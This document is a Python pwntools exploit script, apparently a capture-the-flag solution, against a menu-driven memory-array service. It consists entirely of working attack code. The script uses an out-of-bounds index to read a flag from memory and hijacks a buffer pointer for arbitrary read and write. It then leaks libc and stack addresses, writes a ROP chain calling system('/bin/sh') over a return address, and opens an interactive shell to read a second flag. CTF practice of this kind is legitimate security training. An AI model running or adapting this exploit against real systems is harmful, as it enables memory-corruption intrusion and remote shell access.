from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "saferrrust-kmelwbhc3nnli.shellweplayaga.me"
    port = 1337
else:
    host = args.host
    port = args.port


def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=b':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

def input_index(n):
    recvuntil(b"index > ")
    sendline(str(n).encode("ascii"))
def input_pos(n):
    recvuntil(b"pos > ")
    sendline(str(n).encode("ascii"))
def input_size(n):
    recvuntil(b"size > ")
    sendline(str(n).encode("ascii"))
def input_data(n):
    recvuntil(b"data > ")
    sendline(str(n).encode("ascii"))
def menu(n):
    recvuntil(b"> ")
    sendline(str(n).encode("ascii"))

def create(idx, size):
    menu(1)
    input_index(idx)
    input_size(size)

def put(idx, pos, data):
    menu(2)
    input_index(idx)
    input_pos(pos)
    input_data(data)

def read(idx, pos):
    menu(3)
    input_index(idx)
    input_pos(pos)
    recvuntil(b"data > ")
    return int(recvline())


FLAG1 = 0x404060
bufs = 0x4040d0
sizes = 0x4040e8
create(0, 2 ** 32 - 1)

puts_got = 0x403fa8

s = b""
for i in range(40):
    x = read(0, FLAG1 // 4 + i)
    s += p32(x)
print("FLAG1: ", s.split(b"\x00")[0].decode("ascii"))

size1 = sizes + 4
idx = size1 // 4
put(0, idx, 0xffffffff)

def set_buf1(addr):
    lower = addr & (2 **32 - 1)
    upper = addr >> 32
    buf1 = bufs + 8
    idx = buf1 // 4
    put(0, idx, lower)
    put(0, idx + 1, upper)

def read_u64(addr):
    set_buf1(addr)
    lower = read(1, 0)
    upper = read(1, 1)
    return (upper << 32) + lower

def put_u64(addr, data):
    lower = data & (2 **32 - 1)
    upper = data >> 32
    set_buf1(addr)
    put(1, 0, lower)
    put(1, 1, upper)


libc_base = read_u64(puts_got) - 555984
print("libc_base: ", hex(libc_base))

environ = libc_base + 2141528
system = libc_base + 362304
binsh = libc_base + 1881135
poprdi = libc_base + 1111899
ret = poprdi + 1

stack_addr = read_u64(environ)
print("stack_addr: ", hex(stack_addr))

ret_addr = stack_addr - 304
payload = [
   ret,
   poprdi,
   binsh,
   system
]
for (i, x) in enumerate(payload):
    put_u64(ret_addr + 8 * i, x)

menu(4)
sendline("cat flag2-*")
print("FLAG2: ", recvline().decode("ascii"))
interactive()
